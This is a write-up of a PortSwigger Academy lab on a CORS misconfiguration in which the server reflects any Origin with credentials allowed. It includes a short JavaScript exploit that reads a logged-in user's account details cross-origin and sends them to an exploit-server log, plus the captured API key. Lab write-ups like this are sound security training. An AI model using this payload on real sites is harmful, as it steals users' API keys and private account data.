## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/6e584794-2f89-4486-b9ef-0550f5dac779)

## Solution :

### Server-generated ACAO header from client-specified Origin header

Some applications need to provide access to a number of other domains. Maintaining a list of allowed domains requires ongoing effort, and any mistakes risk breaking functionality. So some applications take the easy route of effectively allowing access from any other domain.

One way to do this is by reading the Origin header from requests and including a response header stating that the requesting origin is allowed. For example, consider an application that receives the following request:
```
GET /sensitive-victim-data HTTP/1.1
Host: vulnerable-website.com
Origin: https://malicious-website.com
Cookie: sessionid=...
```
It then responds with:
```
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://malicious-website.com
Access-Control-Allow-Credentials: true
```

These headers state that access is allowed from the requesting domain (malicious-website.com) and that the cross-origin requests can include cookies (Access-Control-Allow-Credentials: true) and 
so will be processed in-session.

Because the application reflects arbitrary origins in the Access-Control-Allow-Origin header, this means that absolutely any domain can access resources from the vulnerable domain. 


First let's login as wiener using the credentials given - wiener:peter

Once logged in , we can see that there is an email update functionality & the API key of wiener.

In the HTTP history tab, we can see that the GET request to /accountDetails contains the ACAC=true header in its response.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/10b1b9ae-66e5-4992-886b-cc96353e4251)

This meaans that if we can able to exploit CORS here then we can able to get the session cookie, API key etc of the user.

Note that there is no Origin header in the request that's why we don't see any Access-Control-Allow-Origin header too.

Exploiting CORS misconfiguration -

If we try to provide Origin: malicious.com , we can see that there is Access-Control-Allow-Origin: malicious.com & Access-Control-Allow-Credentials: true in the response.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/82e9284e-6b17-4830-9feb-f1c14d5108f4)

This means the server takes the Origin provided in the request and sends it back in the response with the header Access-Control-Allow-Origin: <origin.com>.

Go to exploit server and paste the following code.

```
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0aca000b03408aa480b9856d00e600f5.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();

function reqListener() {
   location='/log?key='+this.responseText;
};
</script>
```
![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/422b112f-65fe-425d-836f-be5d47115a0f)

go to access log

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/57da86a7-036d-4d4c-b882-b58f7fbc3e2c)

Apikey=`oiWxRsIrwvyUZRI3xmNSWDEoFNmtR9qY`

go and submit solution to solve the lab.

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/78db241e-73ea-4a4d-9d4b-c846f84d0889)

